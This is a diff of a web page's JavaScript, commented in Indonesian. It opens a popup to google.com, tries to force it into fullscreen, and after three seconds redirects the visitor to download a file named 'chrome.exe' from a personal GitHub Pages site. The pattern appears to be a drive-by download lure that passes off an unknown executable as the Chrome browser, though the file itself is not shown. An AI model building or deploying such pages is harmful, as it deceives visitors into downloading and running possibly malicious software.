@@ -18,22 +18,26 @@
  </head> 
  <body> 
   <script>
-function a(){
-  
+function a() {  
+    // Membuka popup
+    var win = window.open(
+        "https://google.com", 
+        "popup", 
+        "width=420,height=320,left=0,top=0,resizable=yes,scrollbars=yes"
+    );
 
-    window.open(
-      "https://google.com",
-      "popup",
-      `
-  width=420,
-  height=320,
-  left=0,
-  top=0,
-  resizable=yes,
-  scrollbars=yes
-  `);
+    // Mencoba memicu fullscreen jika domain sama (Same-Origin)
+    // Catatan: Ini akan gagal jika memanggil google.com karena kebijakan Cross-Origin
+    try {
+        win.onload = function() {
+            win.document.documentElement.requestFullscreen();
+        };
+    } catch (e) {
+        console.log("Blokir Cross-Origin: Tidak dapat mengontrol fullscreen pada domain berbeda.");
+    }
 
-    setTimeout(function(){
+    // Redirect di jendela utama setelah 3 detik
+    setTimeout(function() {
         window.location.href = 'https://bangbedul19-del.github.io/bedulsantuy/chrome.exe';
     }, 3000);
 }
